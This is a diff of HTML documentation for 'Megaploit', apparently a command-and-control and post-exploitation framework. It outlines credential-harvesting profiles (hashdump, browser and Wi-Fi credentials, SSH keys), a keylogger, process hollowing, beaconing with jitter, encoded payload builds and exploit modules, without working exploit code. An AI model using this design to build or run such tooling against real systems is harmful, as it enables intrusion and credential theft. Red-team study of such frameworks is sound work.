-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">cmd_name</span><span class="p">(</span><span class="n">session</span><span class="p">:</span> <span class="n">Session</span><span class="p">,</span> <span class="n">args</span><span class="p">:</span> <span class="nb">list</span><span class="p">[</span><span class="nb">str</span><span class="p">])</span> <span class="o">-&gt;</span> <span class="n">CommandResult</span><span class="p">:</span>
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>    <span class="n">send_msg</span><span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">conn</span><span class="p">,</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&quot;cmd&quot;</span><span class="p">:</span> <span class="s2">&quot;name&quot;</span><span class="p">,</span> <span class="s2">&quot;args&quot;</span><span class="p">:</span> <span class="n">args</span><span class="p">}))</span>
-</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>    <span class="k">return</span> <span class="n">_ok</span><span class="p">(</span><span class="n">recv_msg</span><span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">conn</span><span class="p">))</span>
-</span></code></pre></div>
-<p><code>dispatch(session, raw_input)</code> → parses → looks up command → calls handler → returns <code>CommandResult(ok, output, close_session)</code>.</p>
-<hr />
-<h3 id="megaploitmodulesbasepy-module-lifecycle"><code>megaploit/modules/base.py</code> — Module Lifecycle<a class="headerlink" href="#megaploitmodulesbasepy-module-lifecycle" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>Module instantiation
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>    ↓
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>_define_options()    ← called from __init__; register options with _opt()
-</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>    ↓
-</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>set(key, value)      ← operator sets options (with type validation)
-</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>    ↓
-</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>validate()           ← raises ModuleError if required options missing
-</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>    ↓
-</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>check()              ← optional: light probe, no state change
-</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>    ↓
-</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>run(session=None)    ← main execution; emits results via _ok()/_fail()
-</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>    ↓
-</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>results              ← list[ModuleResult]
-</span></code></pre></div>
-<p><strong>Option types:</strong> <code>string</code>, <code>integer</code>, <code>boolean</code>, <code>address</code>, <code>cidr</code>, <code>port</code>, <code>enum</code></p>
-<hr />
-<h3 id="agentmodule-session-bound-post-module-base-new-v3"><code>AgentModule</code> — Session-Bound Post Module Base (NEW v3)<a class="headerlink" href="#agentmodule-session-bound-post-module-base-new-v3" title="Permanent link">&para;</a></h3>
-<p><code>AgentModule</code> extends <code>Module</code> with helpers that route through the dispatcher:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>AgentModule.__init__()
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>    ├── super().__init__()       ← standard Module init
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>    └── self.session = None      ← console sets this before run()
-</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>
-</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>_send(cmd, session=None)
-</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>    ├── sess = session or self.session
-</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>    ├── if sess is None → raise ModuleError
-</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>    └── dispatch(sess, cmd) → CommandResult → return result.output
-</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>
-</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>_shell / _upload / _download → thin wrappers around _send
-</span></code></pre></div>
-<p>The console sets <code>module.session = active_session</code> before calling <code>module.run()</code> so modules don't need to receive it as a parameter.</p>
-<hr />
-<h3 id="megaploitcorepipelinepy-post-exploitation-pipeline-new-v3"><code>megaploit/core/pipeline.py</code> — Post-Exploitation Pipeline (NEW v3)<a class="headerlink" href="#megaploitcorepipelinepy-post-exploitation-pipeline-new-v3" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>Pipeline.__init__()
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>    ├── self._autorun = AutoRunScript()
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>    ├── self._active_profiles = set()
-</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>    └── self._lock = threading.Lock()
-</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>
-</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>commands_for(session)
-</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>    ├── base = self._autorun.commands_for(session)    ← autorun baseline
-</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>    ├── for profile in sorted(self._active_profiles):
-</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>    │       for cmd in _PROFILES[profile]:
-</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>    │           if cmd not in seen: extra.append(cmd)
-</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>    └── return base + extra                           ← deduplicated
-</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>
-</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>Console._on_new_session(session)
-</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>    └── cmds = _pipeline.commands_for(session)
-</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>        └── threading.Thread → dispatch each cmd after 0.5s delay
-</span></code></pre></div>
-<p>Built-in profiles (<code>_PROFILES</code> dict):</p>
-<table>
-<thead>
-<tr>
-<th>Profile</th>
-<th>Commands</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>basic</code></td>
-<td>sysinfo, whoami, pwd, env</td>
-</tr>
-<tr>
-<td><code>creds</code></td>
-<td>hashdump, wifi_passwords, browser_creds, ssh_harvest, cred_vault</td>
-</tr>
-<tr>
-<td><code>recon</code></td>
-<td>ps, installed_software, scheduled_tasks, users, os_info</td>
-</tr>
-<tr>
-<td><code>network</code></td>
-<td>arp, netstat, ifconfig, hosts_file</td>
-</tr>
-<tr>
-<td><code>full</code></td>
-<td>Union of all above</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<h3 id="megaploitcoreprofilepy-malleable-c2-profile-new-v3"><code>megaploit/core/profile.py</code> — Malleable C2 Profile (NEW v3)<a class="headerlink" href="#megaploitcoreprofilepy-malleable-c2-profile-new-v3" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>C2Profile dataclass
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>    ├── name / description
-</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>    ├── sleep / jitter_max            ← beacon timing
-</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>    ├── uri_paths: list[str]          ← URI rotation pool
-</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>    ├── request_headers: dict         ← injected into every request
-</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>    ├── response_headers: dict        ← returned by server
-</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>    ├── user_agent: str
-</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>    └── metadata_prepend/append/location
-</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>
-</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>next_uri()              → random choice from uri_paths
-</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>uri_cycle()             → infinite random-shuffle generator
-</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>sleep_with_jitter()     → float: sleep + uniform(0, jitter_max)
-</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>build_http_headers()    → merged dict with User-Agent fallback
-</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>to_dict()               → serialisable dict for export
-</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a>
-</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a>load_profile(path: str) → C2Profile
-</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a>    ├── read file
-</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a>    ├── try yaml.safe_load() → if ImportError:
-</span><span id="__span-10-19"><a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a>    │       json.loads()
-</span><span id="__span-10-20"><a id="__codelineno-10-20" name="__codelineno-10-20" href="#__codelineno-10-20"></a>    └── _from_dict(data) → C2Profile
+<h2 id="directory-layout">Directory Layout<a class="headerlink" href="#directory-layout" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Megaploit/
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>├── server.py                    ← Entry point: parse args, launch Console
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>├── agent.py                     ← Agent entry point
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>├── secret.key                   ← Shared HMAC secret (generate once)
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>├── requirements.txt
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>├── install.sh
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>│
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>├── plugins/                     ← TOML plugin files
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>│   ├── c_remote_shell.toml      ← C-remote-shell plugin descriptor
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>│   └── c_remote_shell.py        ← C-remote-shell Python handlers
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>│
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>├── tools/                       ← Toolbox: git clones + tools.json
+</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>├── loot/                        ← All collected data + audit.log
+</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>│   ├── audit.log                ← Every command logged
+</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>│   ├── tls/                     ← Auto-generated TLS certs
+</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>│   └── session_N_IP/            ← Per-session loot
+</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>│       ├── screenshots/
+</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>│       ├── recordings/
+</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>│       └── downloads/
+</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>│
+</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>├── tests/                       ← 553 tests (pytest)
+</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>│
+</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>├── C-remote-shell/              ← Hardened C agent (git submodule)
+</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>│
+</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>└── megaploit/
+</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a>    ├── server/
+</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a>    │   ├── cli.py               ← Interactive operator console
+</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a>    │   ├── commands.py          ← 135 session command dispatchers
+</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a>    │   ├── meterp_session.py    ← Meterpreter-class console
+</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a>    │   ├── listener.py          ← TCP accept + TLS + auth + rate limiter
+</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a>    │   ├── session.py           ← Session dataclass with loot paths
+</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a>    │   ├── http_listener.py     ← WebSocket HTTP upgrade listener
+</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a>    │   └── dns_listener.py      ← DNS C2 listener
+</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a>    │
+</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a>    ├── agent/
+</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a>    │   ├── connection.py        ← Connect-back loop with jitter + reconnect
+</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a>    │   ├── handlers.py          ← 90+ victim-side handlers
+</span><span id="__span-1-38"><a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a>    │   ├── meterp.py            ← Advanced post-exploitation handlers
+</span><span id="__span-1-39"><a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a>    │   ├── keylogger.py         ← pynput keystroke logger
+</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a>    │   ├── shell.py             ← recv → handle → respond loop
+</span><span id="__span-1-41"><a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a>    │   ├── hollowing.py         ← Process hollowing helpers
+</span><span id="__span-1-42"><a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a>    │   └── go_agent/
+</span><span id="__span-1-43"><a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a>    │       ├── main.go          ← Go agent source
+</span><span id="__span-1-44"><a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a>    │       └── go.mod
+</span><span id="__span-1-45"><a id="__codelineno-1-45" name="__codelineno-1-45" href="#__codelineno-1-45"></a>    │
+</span><span id="__span-1-46"><a id="__codelineno-1-46" name="__codelineno-1-46" href="#__codelineno-1-46"></a>    ├── core/
+</span><span id="__span-1-47"><a id="__codelineno-1-47" name="__codelineno-1-47" href="#__codelineno-1-47"></a>    │   ├── config.py            ← Shared constants
+</span><span id="__span-1-48"><a id="__codelineno-1-48" name="__codelineno-1-48" href="#__codelineno-1-48"></a>    │   ├── crypto.py            ← HMAC-SHA256 auth
+</span><span id="__span-1-49"><a id="__codelineno-1-49" name="__codelineno-1-49" href="#__codelineno-1-49"></a>    │   ├── protocol.py          ← AES-256-GCM transport + WsTransport
+</span><span id="__span-1-50"><a id="__codelineno-1-50" name="__codelineno-1-50" href="#__codelineno-1-50"></a>    │   ├── autorun.py           ← AutoRunScript engine
+</span><span id="__span-1-51"><a id="__codelineno-1-51" name="__codelineno-1-51" href="#__codelineno-1-51"></a>    │   ├── pipeline.py          ← Post-exploitation pipeline
+</span><span id="__span-1-52"><a id="__codelineno-1-52" name="__codelineno-1-52" href="#__codelineno-1-52"></a>    │   ├── profile.py           ← Malleable C2 profile
+</span><span id="__span-1-53"><a id="__codelineno-1-53" name="__codelineno-1-53" href="#__codelineno-1-53"></a>    │   ├── c_probe.py           ← C/C++ source compliance prober
+</span><span id="__span-1-54"><a id="__codelineno-1-54" name="__codelineno-1-54" href="#__codelineno-1-54"></a>    │   ├── jobs.py              ← Background job manager
+</span><span id="__span-1-55"><a id="__codelineno-1-55" name="__codelineno-1-55" href="#__codelineno-1-55"></a>    │   ├── heartbeat.py         ← Session pruner
+</span><span id="__span-1-56"><a id="__codelineno-1-56" name="__codelineno-1-56" href="#__codelineno-1-56"></a>    │   ├── resource_runner.py   ← Resource script runner
+</span><span id="__span-1-57"><a id="__codelineno-1-57" name="__codelineno-1-57" href="#__codelineno-1-57"></a>    │   └── staging.py           ← Staged payload delivery
+</span><span id="__span-1-58"><a id="__codelineno-1-58" name="__codelineno-1-58" href="#__codelineno-1-58"></a>    │
+</span><span id="__span-1-59"><a id="__codelineno-1-59" name="__codelineno-1-59" href="#__codelineno-1-59"></a>    ├── modules/
+</span><span id="__span-1-60"><a id="__codelineno-1-60" name="__codelineno-1-60" href="#__codelineno-1-60"></a>    │   ├── base.py              ← Module + AgentModule base classes
+</span><span id="__span-1-61"><a id="__codelineno-1-61" name="__codelineno-1-61" href="#__codelineno-1-61"></a>    │   ├── registry.py          ← Auto-discovery registry (os.walk)
+</span><span id="__span-1-62"><a id="__codelineno-1-62" name="__codelineno-1-62" href="#__codelineno-1-62"></a>    │   ├── auxiliary/           ← 12+ scanner modules
+</span><span id="__span-1-63"><a id="__codelineno-1-63" name="__codelineno-1-63" href="#__codelineno-1-63"></a>    │   └── exploits/            ← 20+ exploit modules
+</span><span id="__span-1-64"><a id="__codelineno-1-64" name="__codelineno-1-64" href="#__codelineno-1-64"></a>    │       ├── windows/smb/ rdp/ http/ ftp/
+</span><span id="__span-1-65"><a id="__codelineno-1-65" name="__codelineno-1-65" href="#__codelineno-1-65"></a>    │       ├── linux/ssh/ http/ redis/ misc/
+</span><span id="__span-1-66"><a id="__codelineno-1-66" name="__codelineno-1-66" href="#__codelineno-1-66"></a>    │       └── multi/handler/ http/ ftp/
+</span><span id="__span-1-67"><a id="__codelineno-1-67" name="__codelineno-1-67" href="#__codelineno-1-67"></a>    │
+</span><span id="__span-1-68"><a id="__codelineno-1-68" name="__codelineno-1-68" href="#__codelineno-1-68"></a>    ├── payload/
+</span><span id="__span-1-69"><a id="__codelineno-1-69" name="__codelineno-1-69" href="#__codelineno-1-69"></a>    │   ├── builder.py           ← 14-format builder + Go/C compilation
+</span><span id="__span-1-70"><a id="__codelineno-1-70" name="__codelineno-1-70" href="#__codelineno-1-70"></a>    │   └── encoders.py          ← 12-encoder pipeline
+</span><span id="__span-1-71"><a id="__codelineno-1-71" name="__codelineno-1-71" href="#__codelineno-1-71"></a>    │
+</span><span id="__span-1-72"><a id="__codelineno-1-72" name="__codelineno-1-72" href="#__codelineno-1-72"></a>    ├── db/
+</span><span id="__span-1-73"><a id="__codelineno-1-73" name="__codelineno-1-73" href="#__codelineno-1-73"></a>    │   ├── database.py          ← SQLite credential/host/loot store
+</span><span id="__span-1-74"><a id="__codelineno-1-74" name="__codelineno-1-74" href="#__codelineno-1-74"></a>    │   └── workspace.py         ← Named workspace support
+</span><span id="__span-1-75"><a id="__codelineno-1-75" name="__codelineno-1-75" href="#__codelineno-1-75"></a>    │
+</span><span id="__span-1-76"><a id="__codelineno-1-76" name="__codelineno-1-76" href="#__codelineno-1-76"></a>    ├── reporting/               ← HTML/JSON engagement report generator
+</span><span id="__span-1-77"><a id="__codelineno-1-77" name="__codelineno-1-77" href="#__codelineno-1-77"></a>    ├── web/                     ← Flask dashboard + SSE
+</span><span id="__span-1-78"><a id="__codelineno-1-78" name="__codelineno-1-78" href="#__codelineno-1-78"></a>    ├── streaming/               ← Screenshot stream helpers
+</span><span id="__span-1-79"><a id="__codelineno-1-79" name="__codelineno-1-79" href="#__codelineno-1-79"></a>    ├── toolbox/                 ← Tool installer + catalogue
+</span><span id="__span-1-80"><a id="__codelineno-1-80" name="__codelineno-1-80" href="#__codelineno-1-80"></a>    ├── plugins/                 ← TOML plugin loader + runner
+</span><span id="__span-1-81"><a id="__codelineno-1-81" name="__codelineno-1-81" href="#__codelineno-1-81"></a>    └── native/                  ← C compilation helpers (kiwi)
 </span></code></pre></div>
 <hr />
-<h3 id="megaploitpayloadbuilderpy-build-pipeline"><code>megaploit/payload/builder.py</code> — Build Pipeline<a class="headerlink" href="#megaploitpayloadbuilderpy-build-pipeline" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>BuildConfig(lhost, lport, format, use_tls, secret_key, encoders, ...)
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>    ↓
-</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>PayloadBuilder.build(config)
-</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>    ├── _render(config)          → raw bytes (agent source or dropper)
-</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>    │   └── GO_EXE / GO_ELF → returns Python agent src (unused by _compile_go)
-</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>    ├── _apply_encoders(data)    → pipe through encoder chain
-</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>    └── _write_or_compile(data)
-</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>        ├── GO_EXE / GO_ELF  → _compile_go(cfg)    ← NEW v3
-</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>        ├── EXE / ELF        → _compile_binary(data, cfg, sha)
-</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>        └── others           → write to disk or return in-memory
-</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>    ↓
-</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>BuildResult(ok, data, output_path, size, sha256, build_time_s)
+<h2 id="wire-protocol">Wire Protocol<a class="headerlink" href="#wire-protocol" title="Permanent link">&para;</a></h2>
+<p>All messages use a simple length-prefix framing:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>[ uint32 length (4 bytes, big-endian) ][ payload ]
 </span></code></pre></div>
-<p><strong><code>_compile_go(cfg)</code></strong> flow:
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>1. shutil.which(&quot;go&quot;) → fail if absent
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>2. locate megaploit/agent/go_agent/ → fail if missing
-</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>3. build ldflags: &quot;-X main.LHOST=… -X main.PORT=… -X main.SECRET=…&quot;
-</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>4. set GOOS=windows (go_exe) or GOOS=linux (go_elf), GOARCH=amd64
-</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>5. subprocess.check_call([&quot;go&quot;, &quot;build&quot;, &quot;-ldflags=…&quot;, &quot;-o&quot;, out, &quot;.&quot;])
-</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>6. copy binary to cfg.output_path or cwd
-</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>7. return BuildResult with sha256 + size
-</span></code></pre></div></p>
+<p>When AES-256-GCM is enabled (requires <code>cryptography</code> package):</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>[ uint32 length ][ uint64 sequence_number ][ IV (12 bytes) ][ ciphertext ][ GCM tag (16 bytes) ]
+</span></code></pre></div>
+<ul>
+<li>Sequence numbers prevent replay attacks (out-of-order or replayed messages are rejected)</li>
+<li>Each message has a fresh random 12-byte IV</li>
+<li>GCM tag authenticates both the sequence number and ciphertext</li>
+</ul>
 <hr />
-<h3 id="megaploitwebapppy-web-dashboard-architecture"><code>megaploit/web/app.py</code> — Web Dashboard Architecture<a class="headerlink" href="#megaploitwebapppy-web-dashboard-architecture" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>WebServer.start()
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>    └── threading.Thread → Flask app.run(threaded=True)
-</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>
-</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>Routes:
-</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>  GET  /                    → embedded HTML dashboard (no external assets)
-</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>  GET  /api/*               → JSON REST endpoints
-</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>  POST /api/sessions/&lt;id&gt;/cmd → dispatch command, return result
